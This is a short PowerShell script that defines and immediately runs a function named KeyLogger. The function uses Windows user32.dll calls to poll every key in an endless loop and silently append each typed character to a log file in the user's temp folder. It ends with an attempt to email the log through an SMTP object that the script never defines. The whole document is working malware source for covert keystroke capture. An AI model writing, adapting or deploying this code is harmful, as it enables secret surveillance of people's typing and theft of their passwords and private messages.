function KeyLogger($logFilePath = "$env:temp/$env:Username.log"){

    echo "" >> $logFilePath

$APISignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keyboardState);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyboardState, System.Text.StringBuilder buffer, int bufferSize, uint uFlag);
'@

    # convert the API signatures into a usuable .Net class within the script
    $API = Add-Type -MemberDefinition $APISignatures -Name 'Win32' -Namespace API -PassThru

    try{
        while ($true) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $keystroke = $API::GetAsyncKeyState($ascii)

                if($keystroke -eq -32767){
                    $null = [console]::CapsLock

                    $scanCode = $API::MapVirtualKey($ascii, 3)
                    $keyboardState =  New-Object Byte[] 256
                    $getKeyboardState = $API::GetKeyboardState($keyboardState)
                    
                    #creating a buffer to store the translated characters
                    $loggedchar = New-Object -TypeName System.Text.StringBuilder

                    #save the translated characters to our file which is in the "$logFilePath"
                    if($API::ToUnicode($ascii, $scanCode, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)){
                        [System.IO.File]::AppendAllText($logFilePath, $loggedchar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally{
        $smtp.send($email,$email,$subject,$logs)
    }
}


KeyLogger